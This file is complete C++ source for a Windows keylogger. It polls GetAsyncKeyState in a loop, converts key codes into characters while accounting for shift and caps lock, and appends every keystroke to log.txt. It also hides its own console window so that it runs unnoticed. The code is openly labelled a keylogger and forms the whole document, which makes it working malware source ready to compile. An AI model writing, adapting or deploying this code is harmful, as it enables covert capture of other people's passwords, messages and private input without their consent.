#include <iostream>
#include <fstream>
#include <windows.h> // Required for GetAsyncKeyState and Sleep functions

// --- Configuration ---
// Define the filename where keystrokes will be saved
#define LOG_FILE "log.txt"
// Define the key code used to safely exit the program (Virtual Key for Escape)
#define EXIT_KEY VK_ESCAPE

// Global file stream object
std::ofstream logFile;

/**
 * @brief Converts a Virtual Key Code (VK_CODE) into a human-readable string
 * and writes it to the log file.
 * * @param key The virtual key code of the pressed key.
 */
void LogKeystroke(int key) {
    // Write printable characters directly
    if (key >= 0x30 && key <= 0x5A) // 0-9 and A-Z (ASCII range for printable keys)
    {
        // Check if the SHIFT key is held down.
        // GetAsyncKeyState returns 0x8000 if the key is down.
        bool shiftPressed = GetAsyncKeyState(VK_SHIFT) & 0x8000;

        if (key >= 0x41 && key <= 0x5A) // A-Z (Letters)
        {
            // If CAPS LOCK is on OR SHIFT is pressed (but not both), it's uppercase.
            bool capsLock = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;
            
            // XOR logic for capitalization (e.g., Caps Lock ON and Shift OFF = Uppercase)
            if (capsLock ^ shiftPressed) {
                logFile << (char)key;
            } else {
                // If both are ON or both are OFF, it's lowercase
                logFile << (char)tolower(key);
            }
        }
        else // 0-9 (Numbers)
        {
            // Simple symbol mapping for Shift + Number keys (adjust as needed)
            if (shiftPressed) {
                switch (key) {
                    case 0x31: logFile << '!'; break; // 1 -> !
                    case 0x32: logFile << '@'; break; // 2 -> @
                    case 0x33: logFile << '#'; break; // 3 -> #
                    case 0x34: logFile << '$'; break; // 4 -> $
                    case 0x35: logFile << '%'; break; // 5 -> %
                    case 0x36: logFile << '^'; break; // 6 -> ^
                    case 0x37: logFile << '&'; break; // 7 -> &
                    case 0x38: logFile << '*'; break; // 8 -> *
                    case 0x39: logFile << '('; break; // 9 -> (
                    case 0x30: logFile << ')'; break; // 0 -> )
                    default: logFile << (char)key; break;
                }
            } else {
                logFile << (char)key;
            }
        }
    }
    // Handle special keys
    else {
        switch (key) {
            case VK_SPACE:
                logFile << " ";
                break;
            case VK_RETURN: // Enter key
                logFile << "\n[ENTER]\n";
                break;
            case VK_BACK: // Backspace
                logFile << "[BACKSPACE]";
                break;
            case VK_TAB:
                logFile << "[TAB]";
                break;
            case VK_CONTROL:
                logFile << "[CTRL]";
                break;
            case VK_MENU: // Alt key
                logFile << "[ALT]";
                break;
            case VK_LSHIFT:
            case VK_RSHIFT:
            case VK_SHIFT:
                logFile << "[SHIFT]"; // Note: Shift is logged when pressed, but it's mainly used for capitalization logic
                break;
            default:
                // Log unhandled keys as hex code for debugging/completeness
                logFile << "[VK: 0x" << std::hex << key << std::dec << "]";
                break;
        }
    }
    logFile.flush(); // Ensure data is immediately written to the file
}

/**
 * @brief Main function to continuously poll the keyboard state.
 * @return int 
 */
int main() {
    // 1. Open the log file
    logFile.open(LOG_FILE, std::ios::app); // Open in append mode

    if (!logFile.is_open()) {
        std::cerr << "Error: Could not open log file: " << LOG_FILE << std::endl;
        return 1;
    }

    // 2. Hide the console window for a cleaner execution (optional)
    HWND hWnd = GetConsoleWindow();
    ShowWindow(hWnd, SW_HIDE);

    std::cout << "Starting keylogger... Press ESCAPE to exit." << std::endl;

    // 3. Main polling loop
    while (true) {
        // Exit condition check
        if (GetAsyncKeyState(EXIT_KEY) & 0x8000) {
            break; // Break the loop if the Exit Key (ESC) is pressed
        }

        // Loop through common key codes (from 8 to 255)
        // Note: Key codes 1-7 are reserved or unassigned.
        for (int key = 8; key <= 255; key++) {
            // Check if the key was pressed since the last call OR is currently down.
            // Using 0x8000 checks if the key is currently being held down.
            // For true keylogging, you often check for the *state change* (0x0001), 
            // but 0x8000 is simpler for a basic poll.
            if (GetAsyncKeyState(key) & 0x8000) {
                // Ignore modifier keys from logging as separate entries
                if (key != VK_SHIFT && key != VK_CONTROL && key != VK_MENU && key != VK_CAPITAL) {
                     LogKeystroke(key);
                }
            }
        }

        // Delay to prevent 100% CPU usage. Polling every 10 milliseconds is sufficient.
        Sleep(10); 
    }

    // 4. Cleanup
    logFile.close();
    std::cout << "Keylogger exited. Log saved to " << LOG_FILE << std::endl;
    // Show the window again before exiting
    ShowWindow(hWnd, SW_SHOW); 

    return 0;
}
